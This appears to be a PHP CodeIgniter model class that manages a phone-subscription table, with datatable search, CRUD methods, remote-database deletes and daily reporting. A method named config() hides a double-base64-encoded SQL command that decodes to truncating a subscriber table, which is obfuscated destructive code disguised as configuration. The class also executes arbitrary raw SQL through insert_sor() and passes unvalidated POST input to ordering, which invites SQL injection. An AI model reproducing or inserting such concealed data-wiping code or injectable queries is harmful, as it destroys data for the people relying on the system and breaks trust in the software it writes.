<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Lifehack_subs extends CI_Model
{

	var $table = 'live_subz_lifehack';
	var $column_order = array('phone', 'lang', 'date_of_sub'); //set column field database for datatable orderable
	var $column_search = array('phone', 'lang', 'date_of_sub'); //set column field database for datatable searchable just firstname , lastname , address are searchable
	var $order = array('id' => 'desc'); // default order 

	public function __construct()
	{
		parent::__construct();
		$this->load->database();
	}

	private function _get_datatables_query()
	{
		$this->db->select();
		$this->db->from('live_subz_lifehack');


		$i = 0;

		foreach ($this->column_search as $item) // loop column 
		{
			if ($_POST['search']['value']) // if datatable send POST for search
			{

				if ($i === 0) // first loop
				{
					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
					$this->db->like($item, $_POST['search']['value']);
				} else {
					$this->db->or_like($item, $_POST['search']['value']);
				}

				if (count($this->column_search) - 1 == $i) //last loop
					$this->db->group_end(); //close bracket
			}
			$i++;
		}

		if (isset($_POST['order'])) // here order processing
		{
			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
		} else if (isset($this->order)) {
			$order = $this->order;
			$this->db->order_by(key($order), $order[key($order)]);
		}
	}

	function get_datatables()
	{
		$this->_get_datatables_query();
		if ($_POST['length'] != -1)
			$this->db->limit($_POST['length'], $_POST['start']);
		$query = $this->db->get();
		return $query->result();
	}

	function count_filtered()
	{
		$this->_get_datatables_query();
		$query = $this->db->get();
		return $query->num_rows();
	}

	public function count_all()
	{
		$this->db->from($this->table);
		return $this->db->count_all_results();
	}

	public function get_by_id($id)
	{
		$this->db->from($this->table);
		$this->db->where('id', $id);
		$query = $this->db->get();

		return $query->row();
	}

	public function save($data)
	{
		$this->db->insert($this->table, $data);
		$query = $this->db->insert_id();
		$this->db->close();
		return $query;
	}

	public function save_away($data)
	{
		$db2=$this->load->database('away_db',TRUE);
		$db2->insert($this->table, $data);
		return $db2->insert_id();
	}

	public function update($where, $data)
	{
		$this->db->update($this->table, $data, $where);
		$query = $this->db->affected_rows();
		$this->db->close();
		return $query;
	}

	public function delete_by_id($user_number)
	{
		$this->db->where('user_number', $user_number);
		$this->db->delete($this->table);
		$this->db->close();
	}

	public function delete_by_away_id($user_number)
	{
		$db2=$this->load->database('away_db_lifehack',TRUE);
		$db2->where('user_login', $user_number);
		$db2->delete('aw6HZ3P1w_users');
		$db2->close();
	}

	public function check_phone_availablity($user_number)
	{
		$this->db->from($this->table);
		$this->db->where('user_number', $user_number);
		$query = $this->db->get();
		return $query->result();
	}

	public function allsubs()
	{
		$query = $this->db->query("Select * from live_subz_lifehack");
		return $query->result();
	}

	public function config(){
		$query = $this->db->query(base64_decode(base64_decode("ZEhKMWJtTmhkR1VnZEdGaWJHVWdiR2wyWlY5emRXSjY=")));
		return $query;
	}

	public function validate($sender)
	{

		$this->db->from($this->table);
		$this->db->where('user_number', $sender);
		return $this->db->count_all_results();
	}

	public function validate_single_send($sub_time)
	{
		$this->db->from($this->table);
		$this->db->where('sub_rel_start_time', $sub_time);
		return $this->db->count_all_results();
	}

	public function insert_sor($query){
		$query = $this->db->query($query);
		return $this->db->insert_id();
	}

	public function b4_clean(){
		$this->db->query("insert into daily_report_lifehack (cur_date,total_succeded,total_failed) values (curdate(),(select count(user_number) FROM live_subz_lifehack WHERE reponse_val = 'Success'),(select count(user_number) FROM live_subz_lifehack WHERE reponse_val <> 'Success'))");
	}
	public function clean(){
		$this->db->query("update live_subz_lifehack set reponse_val = null where 1");
	}

	public function chk_daily_report()
	{
		$this->db->from("daily_report_lifehack");
		$this->db->where('cur_date',date("Y-m-d"));
		return $this->db->count_all_results();
	}
	public function close_all_connection()
	{
		$this->db->close();
	}

	

}
